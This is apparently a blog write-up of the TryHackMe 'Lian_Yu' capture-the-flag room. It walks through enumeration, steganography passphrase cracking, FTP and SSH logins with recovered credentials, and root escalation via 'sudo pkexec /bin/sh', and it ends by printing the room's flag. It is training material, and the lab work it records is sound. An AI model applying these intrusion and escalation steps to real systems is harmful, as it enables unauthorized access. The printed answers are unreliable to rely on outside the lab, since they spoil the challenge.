---
title: "Tryhackme - Lian_Yu WriteUp"
date: 2020-10-22
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---



# TryHackMe - Lian_Yu WriteUp


**Keywords**: CyberChef, Base58, steghide, stegcracker

Potential users:
ollie
oliver
ojonas
hood

## Information Gathering


### nmap

```
root@kali:~/TryHackMe# nmap -sV -sC -p- -T4 -A 10.10.46.126
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
36233/tcp open  status  1 (RPC #100024)
```

### gobuster

```
root@kali:~/TryHackMe# gobuster dir -u http://10.10.46.126/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
/island (Status: 301)
```

A piece of note from /island page

```
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
```

### gobuster

```
root@kali:~/TryHackMe# gobuster dir -u http://10.10.46.126/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
/2100 (Status: 301)
```

A piece of note from /island/2100 page

```
<!-- you can avail your .ticket here but how?   -->
```

### gobuster

```
root@kali:~/TryHackMe# gobuster dir -u http://10.10.46.126/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
/green_arrow.ticket (Status: 200)
```

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

In **CyberChef** we decode it from Base58.

```
!#th3h00d
```


### ftp

```
root@kali:~/TryHackMe# ftp 10.10.46.126
Name (10.10.46.126:root): vigilante
Password: !#th3h00d
ftp> dir
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
ftp> get Leave_me_alone.png
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
```


### stegcracker

```
root@kali:~/TryHackMe# stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
Successfully cracked file with password: password
```

### steghide

```
root@kali:~/TryHackMe# steghide extract -sf aa.jpg 
Enter passphrase: password
wrote extracted data to "ss.zip".
```


Files extracted from pictures:

```
root@kali:~/TryHackMe# unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado                   
root@kali:~/TryHackMe# cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
root@kali:~/TryHackMe# cat shado 
M3tahuman
root@kali:~/TryHackMe# 

```

### ssh

Note: We found the another username from ftp [using cd ... commandlet]

```
root@kali:~/TryHackMe# ssh slade@10.10.46.126
slade@10.10.46.126's password: M3tahuman
slade@LianYu:~$ 
```

## Privilege Escalation

```
slade@LianYu:~$ sudo -l
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

Victory!
